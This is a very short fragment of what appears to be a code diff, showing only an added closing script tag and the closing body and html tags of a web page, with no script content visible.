+    </script>
 </body>
 </html>
